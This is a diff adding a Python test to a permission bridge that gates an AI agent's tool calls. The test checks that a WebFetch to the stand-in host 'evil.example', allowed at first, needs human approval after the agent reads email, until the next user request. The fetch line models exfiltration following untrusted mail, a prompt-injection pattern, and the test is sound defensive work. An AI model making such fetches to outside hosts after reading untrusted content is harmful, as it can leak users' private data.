@@ -133,3 +133,16 @@ def test_http_uses_custom_describer_for_card():
     threading.Thread(target=lambda: bridge.resolve(wait_shown(shown), False)).start()
     assert _post(port, token, {"tool_name": "mcp__lia__agenda_cancelar", "input": {"id": "e1"}}) == {"approved": False}
     assert shown[0][1].detail == "Reunião real — 30/10 15:00"
+
+
+def test_http_after_reading_mail_site_asks_until_next_request():
+    from lia.permissions import Taint
+    taint = Taint()
+    bridge, shown = make_bridge(timeout=0.3)
+    port, token = start_bridge(bridge, taint=taint)
+    fetch = {"tool_name": "WebFetch", "input": {"url": "https://evil.example/?q=x"}}
+    assert _post(port, token, fetch) == {"approved": True} and shown == []
+    assert _post(port, token, {"tool_name": "mcp__lia__gmail_ler", "input": {"id": "1"}}) == {"approved": True}
+    assert _post(port, token, fetch) == {"approved": False} and len(shown) == 1  # cartão; ninguém aprovou
+    taint.reset()  # novo pedido do usuário
+    assert _post(port, token, fetch) == {"approved": True} and len(shown) == 1
